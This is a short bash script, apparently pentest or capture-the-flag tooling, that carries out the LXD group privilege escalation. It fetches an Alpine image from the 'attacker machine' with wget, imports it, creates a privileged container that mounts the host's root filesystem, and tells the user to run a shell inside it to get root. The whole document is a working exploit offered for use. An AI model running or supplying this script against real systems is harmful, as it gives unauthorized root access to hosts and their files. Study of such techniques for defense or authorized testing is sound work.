#!/bin/bash

#In order to make work this script you must have in your attacker machine the lxd-alpine-builder and create a tar file 

getfile=$(wget http://insert your ip/alpine-v3.15-x86_64-20220328_1750.tar.gz) #start a python3 server and change your IP also add the route to your file
sleep 5
execute=$(chmod +x alpine-v3.15-x86_64-20220328_1750.tar.gz) #change this to the name of the tar file
sleep 5
P1=$(lxc image import ./alpine-v3.15-x86_64-20220328_1750.tar.gz --alias myimage) #change this too
sleep 5
P2=$(lxc image list)
sleep 5
P3=$(lxc init myimage ignite -c security.privileged=true)
sleep 5
P4=$(lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true)
sleep 5
P5=$(lxc start ignite)
sleep 5


echo "$getfile"
sleep 15
echo "$execute"
sleep 10
echo "$P1"
sleep 7
echo "$P2"
sleep 7
echo "$P3"
sleep 7
echo "$P4"
sleep 7
echo "$P5"
sleep 3
echo "Privilege escalation completed!"
sleep 1
echo  "To obtain root run the command:'lxc exec ignite /bin/sh'  the root files are located in 'mnt/root/root'"
